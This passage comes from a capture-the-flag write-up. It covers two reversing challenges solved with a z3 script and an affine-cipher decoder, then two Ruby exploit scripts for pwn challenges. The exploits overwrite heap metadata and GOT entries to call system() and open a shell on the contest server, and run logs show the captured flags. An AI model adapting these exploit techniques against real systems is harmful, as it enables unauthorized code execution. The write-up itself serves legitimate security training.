<span data-linenumber="21"></span>
<span data-linenumber="22"></span>
<span data-linenumber="23"></span>
<span data-linenumber="24"></span>
<span data-linenumber="25"></span>
<span data-linenumber="26"></span>
<span data-linenumber="27"></span>
<span data-linenumber="28"></span>
<span data-linenumber="29"></span>
<span data-linenumber="30"></span>
<span data-linenumber="31"></span>
<span data-linenumber="32"></span></div><div class="code"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *

xs = [BitVec(<span class="hljs-string">"x%d"</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">8</span>)]

l = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x39</span>]

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, len(l), <span class="hljs-number">8</span>):
    s = Solver()

    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xs:
        s.add(Or(And(<span class="hljs-number">0x30</span> &lt;= x, x &lt;= <span class="hljs-number">0x39</span>), And(<span class="hljs-number">0x41</span> &lt;= x, x &lt;= <span class="hljs-number">0x5a</span>), And(<span class="hljs-number">0x61</span> &lt;= x, x &lt;= <span class="hljs-number">0x7d</span>)))

    xored = []
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">8</span>):
        xored.append(l[i + j] ^ xs[j])

    v2 = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">8</span>):
        v4 = <span class="hljs-number">2</span> * v2 + xored[j]
        v2 = v4

    s.add(v4 == [<span class="hljs-number">178</span>, <span class="hljs-number">163</span>, <span class="hljs-number">204</span>, <span class="hljs-number">187</span>][i/<span class="hljs-number">8</span>])

    r = s.check()
    <span class="hljs-keyword">if</span> r == sat:
        m = s.model()
        tmp = []
        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xs:
            tmp.append(m[x].as_long())
        <span class="hljs-keyword">print</span> <span class="hljs-string">''</span>.join(map(chr,tmp))
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">pass</span>
</div></div></code></pre><p>flag: <code>JZZZXZYP{8ZBIzPL0HPAFwdqZ{3ZXRad</code></p><h2 id="re3-reverse-300">Re3 - reverse 300<a class="header-link hidden-xs" href="#re3-reverse-300" title="re3-reverse-300"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><p>The challenge was about analyzing PE32 also.<br>
This program is packed by UPX too.<br>
After unpack it, I analyzed this program with IDA.<br>
According to its result, flag is encrypted by Affine cipher and its key is dynamically generated.<br>
I can get flag by following script.</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span></div><div class="code">s = <span class="hljs-string">'b5h760h64R867618bBwB48BrW92H4w5r'</span>

t=[]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">26</span>):
    t.append((<span class="hljs-number">28</span>+i*<span class="hljs-number">5</span>)%<span class="hljs-number">26</span>)

flag = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> map(ord, s):
  <span class="hljs-keyword">if</span> c &gt; ord(<span class="hljs-string">'9'</span>) <span class="hljs-keyword">or</span> c &lt; ord(<span class="hljs-string">'0'</span>):
    <span class="hljs-keyword">if</span> c &lt;= ord(<span class="hljs-string">'Z'</span>) <span class="hljs-keyword">and</span> c &gt;= ord(<span class="hljs-string">'A'</span>):
      c -= ord(<span class="hljs-string">'A'</span>)
      is_lower = <span class="hljs-keyword">False</span>
    <span class="hljs-keyword">else</span>:
      c -= ord(<span class="hljs-string">'a'</span>)
      is_lower = <span class="hljs-keyword">True</span>
    c = t.index(c)
    <span class="hljs-keyword">if</span> is_lower:
      flag += chr(c + ord(<span class="hljs-string">'a'</span>))
    <span class="hljs-keyword">else</span>:
      flag += chr(c + ord(<span class="hljs-string">'A'</span>))
  <span class="hljs-keyword">else</span>:
    flag += chr(c)
</div></div></code></pre><p>flag: <code>f5b760b64D867618fFeF48FdE92B4e5d</code></p><h2 id="pwn-1-exploit-400">Pwn-1 - exploit 400<a class="header-link hidden-xs" href="#pwn-1-exploit-400" title="pwn-1-exploit-400"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><pre><code class="ruby hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span>
<span data-linenumber="23"></span>
<span data-linenumber="24"></span>
<span data-linenumber="25"></span>
<span data-linenumber="26"></span>
<span data-linenumber="27"></span>
<span data-linenumber="28"></span>
<span data-linenumber="29"></span>
<span data-linenumber="30"></span>
<span data-linenumber="31"></span>
<span data-linenumber="32"></span>
<span data-linenumber="33"></span>
<span data-linenumber="34"></span>
<span data-linenumber="35"></span>
<span data-linenumber="36"></span>
<span data-linenumber="37"></span>
<span data-linenumber="38"></span>
<span data-linenumber="39"></span>
<span data-linenumber="40"></span>
<span data-linenumber="41"></span>
<span data-linenumber="42"></span>
<span data-linenumber="43"></span>
<span data-linenumber="44"></span>
<span data-linenumber="45"></span>
<span data-linenumber="46"></span>
<span data-linenumber="47"></span>
<span data-linenumber="48"></span>
<span data-linenumber="49"></span>
<span data-linenumber="50"></span>
<span data-linenumber="51"></span>
<span data-linenumber="52"></span>
<span data-linenumber="53"></span>
<span data-linenumber="54"></span>
<span data-linenumber="55"></span>
<span data-linenumber="56"></span>
<span data-linenumber="57"></span>
<span data-linenumber="58"></span>
<span data-linenumber="59"></span>
<span data-linenumber="60"></span>
<span data-linenumber="61"></span>
<span data-linenumber="62"></span>
<span data-linenumber="63"></span>
<span data-linenumber="64"></span>
<span data-linenumber="65"></span>
<span data-linenumber="66"></span>
<span data-linenumber="67"></span>
<span data-linenumber="68"></span>
<span data-linenumber="69"></span>
<span data-linenumber="70"></span>
<span data-linenumber="71"></span>
<span data-linenumber="72"></span>
<span data-linenumber="73"></span>
<span data-linenumber="74"></span>
<span data-linenumber="75"></span>
<span data-linenumber="76"></span>
<span data-linenumber="77"></span>
<span data-linenumber="78"></span>
<span data-linenumber="79"></span>
<span data-linenumber="80"></span>
<span data-linenumber="81"></span>
<span data-linenumber="82"></span>
<span data-linenumber="83"></span>
<span data-linenumber="84"></span>
<span data-linenumber="85"></span>
<span data-linenumber="86"></span>
<span data-linenumber="87"></span>
<span data-linenumber="88"></span>
<span data-linenumber="89"></span>
<span data-linenumber="90"></span>
<span data-linenumber="91"></span>
<span data-linenumber="92"></span>
<span data-linenumber="93"></span>
<span data-linenumber="94"></span>
<span data-linenumber="95"></span>
<span data-linenumber="96"></span>
<span data-linenumber="97"></span>
<span data-linenumber="98"></span>
<span data-linenumber="99"></span>
<span data-linenumber="100"></span>
<span data-linenumber="101"></span>
<span data-linenumber="102"></span>
<span data-linenumber="103"></span>
<span data-linenumber="104"></span>
<span data-linenumber="105"></span>
<span data-linenumber="106"></span>
<span data-linenumber="107"></span>
<span data-linenumber="108"></span>
<span data-linenumber="109"></span>
<span data-linenumber="110"></span>
<span data-linenumber="111"></span>
<span data-linenumber="112"></span>
<span data-linenumber="113"></span>
<span data-linenumber="114"></span>
<span data-linenumber="115"></span>
<span data-linenumber="116"></span>
<span data-linenumber="117"></span>
<span data-linenumber="118"></span>
<span data-linenumber="119"></span>
<span data-linenumber="120"></span>
<span data-linenumber="121"></span>
<span data-linenumber="122"></span>
<span data-linenumber="123"></span>
<span data-linenumber="124"></span>
<span data-linenumber="125"></span>
<span data-linenumber="126"></span>
<span data-linenumber="127"></span>
<span data-linenumber="128"></span>
<span data-linenumber="129"></span>
<span data-linenumber="130"></span>
<span data-linenumber="131"></span>
<span data-linenumber="132"></span>
<span data-linenumber="133"></span></div><div class="code"><span class="hljs-comment">#coding:ascii-8bit</span>
require_relative <span class="hljs-string">"../../pwnlib"</span>  <span class="hljs-comment"># https://github.com/Charo-IT/pwnlib</span>

remote = <span class="hljs-keyword">true</span>
<span class="hljs-keyword">if</span> remote
    host = <span class="hljs-string">"pwn.lab.seclover.com"</span>
    port = <span class="hljs-number">11111</span>
    libc_offset = {
        <span class="hljs-string">"puts"</span> =&gt; <span class="hljs-number">0x625e0</span>,
        <span class="hljs-string">"system"</span> =&gt; <span class="hljs-number">0x3bc90</span>
    }
<span class="hljs-keyword">else</span>
    host = <span class="hljs-string">"localhost"</span>
    port = <span class="hljs-number">11111</span>
    libc_offset = {
        <span class="hljs-string">"puts"</span> =&gt; <span class="hljs-number">0x65650</span>,
        <span class="hljs-string">"system"</span> =&gt; <span class="hljs-number">0x40190</span>
    }
<span class="hljs-keyword">end</span>

offset = {
    <span class="hljs-string">"ret"</span> =&gt; <span class="hljs-number">0x08048b10</span>
}
got = {
    <span class="hljs-string">"__stack_chk_fail"</span> =&gt; <span class="hljs-number">0x0804d02c</span>
}

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>show_history(tube)
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"history\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>reload_history(tube, id)
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"reload\n"</span>)
    tube.recv_until(<span class="hljs-string">"Reload history ID: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{id}</span>\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>clear_history(tube)
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"clear\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>sort_numbers(tube, numbers)
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"sort\n"</span>)
    tube.recv_until(<span class="hljs-string">"How many numbers do you want to sort: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{numbers.length}</span>\n"</span>)
    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> numbers
        tube.recv_until(<span class="hljs-string">"Enter a number: "</span>)
        tube.send(<span class="hljs-string">"<span class="hljs-subst">#{[n].pack(<span class="hljs-string">"L"</span>).unpack(<span class="hljs-string">"l"</span>)[<span class="hljs-number">0</span>]}</span>\n"</span>)
    <span class="hljs-keyword">end</span>
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>query_array(tube, index)
    tube.recv_until(<span class="hljs-string">"Choose: "</span>)
    tube.send(<span class="hljs-string">"1\n"</span>)
    tube.recv_until(<span class="hljs-string">"Query index: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{index}</span>\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>update_array(tube, index, number)
    tube.recv_until(<span class="hljs-string">"Choose: "</span>)
    tube.send(<span class="hljs-string">"2\n"</span>)
    tube.recv_until(<span class="hljs-string">"Update index: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{index}</span>\n"</span>)
    tube.recv_until(<span class="hljs-string">"Update number: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{[number].pack(<span class="hljs-string">"L"</span>).unpack(<span class="hljs-string">"l"</span>)[<span class="hljs-number">0</span>]}</span>\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>sort_array(tube)
    tube.recv_until(<span class="hljs-string">"Choose: "</span>)
    tube.send(<span class="hljs-string">"3\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>quit_sort_menu(tube)
    tube.recv_until(<span class="hljs-string">"Choose: "</span>)
    tube.send(<span class="hljs-string">"7\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-constant">PwnTube</span>.open(host, port){|tube|

    puts <span class="hljs-string">"[*] preparing..."</span>
    sort_numbers(tube, [<span class="hljs-number">1</span>] * <span class="hljs-number">31</span>)
    sort_array(tube)
    quit_sort_menu(tube)

    sort_numbers(tube, [<span class="hljs-number">1</span>])
    quit_sort_menu(tube)

    clear_history(tube)

    sort_numbers(tube, [<span class="hljs-number">1</span>] * <span class="hljs-number">5</span>)
    quit_sort_menu(tube)

    sort_numbers(tube, [<span class="hljs-number">1</span>] * <span class="hljs-number">7</span>)
    sort_array(tube)
    quit_sort_menu(tube)

    sort_numbers(tube, [<span class="hljs-number">1</span>] * <span class="hljs-number">5</span>)

    puts <span class="hljs-string">"[*] overwrite array length"</span>
    update_array(tube, <span class="hljs-number">5</span>, -<span class="hljs-number">1</span>)
    quit_sort_menu(tube)

    puts <span class="hljs-string">"[*] overwrite chunk management area"</span>
    reload_history(tube, <span class="hljs-number">0</span>)
    update_array(tube, <span class="hljs-number">16379</span>, got[<span class="hljs-string">"__stack_chk_fail"</span>])
    quit_sort_menu(tube)

    puts <span class="hljs-string">"[*] leak libc base"</span>
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"sort\n"</span>)
    tube.recv_until(<span class="hljs-string">"How many numbers do you want to sort: "</span>)
    tube.send(<span class="hljs-string">"17\n"</span>)
    tube.recv_until(<span class="hljs-string">"Enter a number: "</span>)
    tube.send(<span class="hljs-string">"a\n"</span>)
    query_array(tube, <span class="hljs-number">0</span>)
    libc_base = (tube.recv_capture(<span class="hljs-regexp">/Query result: (-?\d+)\n/</span>)[<span class="hljs-number">0</span>].to_i &amp; <span class="hljs-number">0xffffffff</span>) - libc_offset[<span class="hljs-string">"puts"</span>]
    puts <span class="hljs-string">"libc base = 0x%08x"</span> % libc_base

    puts <span class="hljs-string">"[*] overwrite got"</span>
    update_array(tube, <span class="hljs-number">3</span>, libc_base + libc_offset[<span class="hljs-string">"system"</span>])
    update_array(tube, <span class="hljs-number">4</span>, offset[<span class="hljs-string">"ret"</span>])
    quit_sort_menu(tube)

    puts <span class="hljs-string">"[*] trigger shell"</span>
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"sh\n"</span>)

    tube.interactive
}
</div></div></code></pre><pre><code>$ ruby pwn1.rb
[*] connected
[*] preparing...
[*] overwrite array length
[*] overwrite chunk management area
[*] leak libc base
libc base = 0xb74ca000
[*] overwrite got
[*] trigger shell
[*] interactive mode
id
uid=1001(pwn4) gid=1001(pwn4) groups=1001(pwn4)
ls -la
total 32
dr-xr-x--- 2 root pwn4  4096 Feb 23 18:07 .
drwx------ 4 root root  4096 Feb 23 17:18 ..
-rwxr-xr-x 1 root root 17980 Feb 15 12:23 4.Exploit1
---------- 1 root root    40 Feb 23 17:21 SSCTF{e8b381956eac817add74767b15c448e4}
[*] connection closed
</code></pre><p>flag: <code>e8b381956eac817add74767b15c448e4</code></p><h2 id="pwn-2-exploit-600">Pwn-2 - exploit 600<a class="header-link hidden-xs" href="#pwn-2-exploit-600" title="pwn-2-exploit-600"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><pre><code class="ruby hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span>
<span data-linenumber="23"></span>
<span data-linenumber="24"></span>
<span data-linenumber="25"></span>
<span data-linenumber="26"></span>
<span data-linenumber="27"></span>
<span data-linenumber="28"></span>
<span data-linenumber="29"></span>
<span data-linenumber="30"></span>
<span data-linenumber="31"></span>
<span data-linenumber="32"></span>
<span data-linenumber="33"></span>
<span data-linenumber="34"></span>
<span data-linenumber="35"></span>
<span data-linenumber="36"></span>
<span data-linenumber="37"></span>
<span data-linenumber="38"></span>
<span data-linenumber="39"></span>
<span data-linenumber="40"></span>
<span data-linenumber="41"></span>
<span data-linenumber="42"></span>
<span data-linenumber="43"></span>
<span data-linenumber="44"></span>
<span data-linenumber="45"></span>
<span data-linenumber="46"></span>
<span data-linenumber="47"></span>
<span data-linenumber="48"></span>
<span data-linenumber="49"></span>
<span data-linenumber="50"></span>
<span data-linenumber="51"></span>
<span data-linenumber="52"></span>
<span data-linenumber="53"></span>
<span data-linenumber="54"></span>
<span data-linenumber="55"></span>
<span data-linenumber="56"></span>
<span data-linenumber="57"></span>
<span data-linenumber="58"></span>
<span data-linenumber="59"></span>
<span data-linenumber="60"></span>
<span data-linenumber="61"></span>
<span data-linenumber="62"></span>
<span data-linenumber="63"></span>
<span data-linenumber="64"></span>
<span data-linenumber="65"></span>
<span data-linenumber="66"></span>
<span data-linenumber="67"></span>
<span data-linenumber="68"></span>
<span data-linenumber="69"></span>
<span data-linenumber="70"></span>
<span data-linenumber="71"></span>
<span data-linenumber="72"></span>
<span data-linenumber="73"></span>
<span data-linenumber="74"></span>
<span data-linenumber="75"></span>
<span data-linenumber="76"></span>
<span data-linenumber="77"></span>
<span data-linenumber="78"></span>
<span data-linenumber="79"></span>
<span data-linenumber="80"></span>
<span data-linenumber="81"></span>
<span data-linenumber="82"></span>
<span data-linenumber="83"></span>
<span data-linenumber="84"></span>
<span data-linenumber="85"></span>
<span data-linenumber="86"></span>
<span data-linenumber="87"></span>
<span data-linenumber="88"></span>
<span data-linenumber="89"></span>
<span data-linenumber="90"></span>
<span data-linenumber="91"></span>
<span data-linenumber="92"></span>
<span data-linenumber="93"></span>
<span data-linenumber="94"></span>
<span data-linenumber="95"></span>
<span data-linenumber="96"></span>
<span data-linenumber="97"></span>
<span data-linenumber="98"></span>
<span data-linenumber="99"></span>
<span data-linenumber="100"></span>
<span data-linenumber="101"></span>
<span data-linenumber="102"></span>
<span data-linenumber="103"></span>
<span data-linenumber="104"></span>
<span data-linenumber="105"></span>
<span data-linenumber="106"></span>
<span data-linenumber="107"></span>
<span data-linenumber="108"></span>
<span data-linenumber="109"></span>
<span data-linenumber="110"></span>
<span data-linenumber="111"></span>
<span data-linenumber="112"></span>
<span data-linenumber="113"></span>
<span data-linenumber="114"></span>
<span data-linenumber="115"></span>
<span data-linenumber="116"></span>
<span data-linenumber="117"></span>
<span data-linenumber="118"></span>
<span data-linenumber="119"></span>
<span data-linenumber="120"></span>
<span data-linenumber="121"></span>
<span data-linenumber="122"></span>
<span data-linenumber="123"></span>
<span data-linenumber="124"></span>
<span data-linenumber="125"></span>
<span data-linenumber="126"></span>
<span data-linenumber="127"></span>
<span data-linenumber="128"></span>
<span data-linenumber="129"></span>
<span data-linenumber="130"></span>
<span data-linenumber="131"></span>
<span data-linenumber="132"></span>
<span data-linenumber="133"></span>
<span data-linenumber="134"></span>
<span data-linenumber="135"></span>
<span data-linenumber="136"></span>
<span data-linenumber="137"></span></div><div class="code"><span class="hljs-comment">#coding:ascii-8bit</span>
require_relative <span class="hljs-string">"../../pwnlib"</span>  <span class="hljs-comment"># https://github.com/Charo-IT/pwnlib</span>

remote = <span class="hljs-keyword">true</span>
<span class="hljs-keyword">if</span> remote
    host = <span class="hljs-string">"pwn.lab.seclover.com"</span>
    port = <span class="hljs-number">22222</span>
    libc_offset = {
        <span class="hljs-string">"_IO_2_1_stdin_"</span> =&gt; <span class="hljs-number">0x164440</span>,
        <span class="hljs-string">"system"</span> =&gt; <span class="hljs-number">0x3bc90</span>
    }
<span class="hljs-keyword">else</span>
    host = <span class="hljs-string">"localhost"</span>
    port = <span class="hljs-number">22222</span>
    libc_offset = {
        <span class="hljs-string">"_IO_2_1_stdin_"</span> =&gt; <span class="hljs-number">0x1aac20</span>,
        <span class="hljs-string">"system"</span> =&gt; <span class="hljs-number">0x40190</span>
    }
<span class="hljs-keyword">end</span>

offset = {
    <span class="hljs-string">"my_canary"</span> =&gt; <span class="hljs-number">0x0804c04c</span>,
}
got = {
    <span class="hljs-string">"putchar"</span> =&gt; <span class="hljs-number">0x0804c00c</span>
}

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>show_history(tube)
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"history\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>reload_history(tube, id)
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"reload\n"</span>)
    tube.recv_until(<span class="hljs-string">"Reload history ID: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{id}</span>\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>clear_history(tube)
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"clear\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>sort_numbers(tube, numbers)
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"sort\n"</span>)
    tube.recv_until(<span class="hljs-string">"How many numbers do you want to sort: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{numbers.length}</span>\n"</span>)
    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> numbers
        tube.recv_until(<span class="hljs-string">"Enter a number: "</span>)
        tube.send(<span class="hljs-string">"<span class="hljs-subst">#{[n].pack(<span class="hljs-string">"L"</span>).unpack(<span class="hljs-string">"l"</span>)[<span class="hljs-number">0</span>]}</span>\n"</span>)
    <span class="hljs-keyword">end</span>
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>query_array(tube, index)
    tube.recv_until(<span class="hljs-string">"Choose: "</span>)
    tube.send(<span class="hljs-string">"1\n"</span>)
    tube.recv_until(<span class="hljs-string">"Query index: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{index}</span>\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>update_array(tube, index, number)
    tube.recv_until(<span class="hljs-string">"Choose: "</span>)
    tube.send(<span class="hljs-string">"2\n"</span>)
    tube.recv_until(<span class="hljs-string">"Update index: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{index}</span>\n"</span>)
    tube.recv_until(<span class="hljs-string">"Update number: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{[number].pack(<span class="hljs-string">"L"</span>).unpack(<span class="hljs-string">"l"</span>)[<span class="hljs-number">0</span>]}</span>\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>sort_array(tube)
    tube.recv_until(<span class="hljs-string">"Choose: "</span>)
    tube.send(<span class="hljs-string">"3\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> </span>quit_sort_menu(tube)
    tube.recv_until(<span class="hljs-string">"Choose: "</span>)
    tube.send(<span class="hljs-string">"7\n"</span>)
<span class="hljs-keyword">end</span>

<span class="hljs-constant">PwnTube</span>.open(host, port){|tube|

    puts <span class="hljs-string">"[*] leak original canary and libc base"</span>
    sort_numbers(tube, [<span class="hljs-number">1</span>] * <span class="hljs-number">2</span>)
    sort_array(tube)
    update_array(tube, <span class="hljs-number">2</span>, offset[<span class="hljs-string">"my_canary"</span>])
    quit_sort_menu(tube)

    show_history(tube)
    canary, libc_base = tube.recv_capture(<span class="hljs-regexp">/Len = (\d+), Data = 0 0 0 (-?\d+) /</span>).map(&amp;<span class="hljs-symbol">:to_i</span>)
    libc_base = (libc_base &amp; <span class="hljs-number">0xffffffff</span>) - libc_offset[<span class="hljs-string">"_IO_2_1_stdin_"</span>]
    puts <span class="hljs-string">"canary = 0x%08x"</span> % canary
    puts <span class="hljs-string">"libc base = 0x%08x"</span> % libc_base

    puts <span class="hljs-string">"[*] preparing..."</span>
    sort_numbers(tube, [<span class="hljs-number">2</span>] * <span class="hljs-number">6</span>)
    update_array(tube, <span class="hljs-number">0</span>, <span class="hljs-number">99999</span>)
    update_array(tube, <span class="hljs-number">1</span>, canary ^ <span class="hljs-number">99999</span>)
    quit_sort_menu(tube)

    sort_numbers(tube, [<span class="hljs-number">3</span>] * <span class="hljs-number">8</span>)
    quit_sort_menu(tube)

    sort_numbers(tube, [<span class="hljs-number">4</span>] * <span class="hljs-number">10</span>)
    sort_array(tube)
    quit_sort_menu(tube)

    puts <span class="hljs-string">"[*] overwrite array length"</span>
    sort_numbers(tube, [<span class="hljs-number">5</span>] * <span class="hljs-number">8</span>)
    update_array(tube, <span class="hljs-number">8</span>, -<span class="hljs-number">2</span>)
    quit_sort_menu(tube)

    puts <span class="hljs-string">"[*] overwrite chunk management area"</span>
    reload_history(tube, <span class="hljs-number">0</span>)
    update_array(tube, <span class="hljs-number">16390</span>, got[<span class="hljs-string">"putchar"</span>])
    quit_sort_menu(tube)

    puts <span class="hljs-string">"[*] overwrite got"</span>
    tube.recv_until(<span class="hljs-string">"_CMD_$ "</span>)
    tube.send(<span class="hljs-string">"sort\n"</span>)
    tube.recv_until(<span class="hljs-string">"How many numbers do you want to sort: "</span>)
    tube.send(<span class="hljs-string">"8\n"</span>)
    tube.recv_until(<span class="hljs-string">"Enter a number: "</span>)
    tube.send(<span class="hljs-string">"0\n"</span>)
    tube.recv_until(<span class="hljs-string">"Enter a number: "</span>)
    tube.send(<span class="hljs-string">"<span class="hljs-subst">#{<span class="hljs-number">0x08048706</span>}</span>\n"</span>)
    tube.recv_until(<span class="hljs-string">"Enter a number: "</span>)
    tube.send(<span class="hljs-string">"a\n"</span>)
    update_array(tube, <span class="hljs-number">2</span>, libc_base + libc_offset[<span class="hljs-string">"system"</span>])

    puts <span class="hljs-string">"[*] trigger shell"</span>
    tube.recv_until(<span class="hljs-string">"Choose: "</span>)
    tube.send(<span class="hljs-string">"sh\n"</span>)

    tube.interactive
}
</div></div></code></pre><pre><code>$ ruby pwn2.rb
[*] connected
[*] leak original canary and libc base
canary = 0x1327b711
libc base = 0xb750e000
[*] preparing...
[*] overwrite array length
[*] overwrite chunk management area
[*] overwrite got
[*] trigger shell
[*] interactive mode
id
uid=1002(pwn5) gid=1002(pwn5) groups=1002(pwn5)
ls -la
total 32
dr-xr-x--- 2 root pwn5  4096 Feb 23 18:04 .
drwx------ 4 root root  4096 Feb 23 17:18 ..
-rwxr-xr-x 1 root root 17928 Feb 15 12:23 5.Exploit2
---------- 1 root root    40 Feb 23 17:21 SSCTF{eaf05181170412ab19d74ba3d5cf15b9}
</code></pre><p>flag: <code>eaf05181170412ab19d74ba3d5cf15b9</code></p><h2 id="heheda-crypto-100">HeHeDa - Crypto 100<a class="header-link hidden-xs" href="#heheda-crypto-100" title="heheda-crypto-100"><span class="sr-only"></span><i class="fa fa-link"></i></a></h2><p>Given encryption algorithm is here:</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
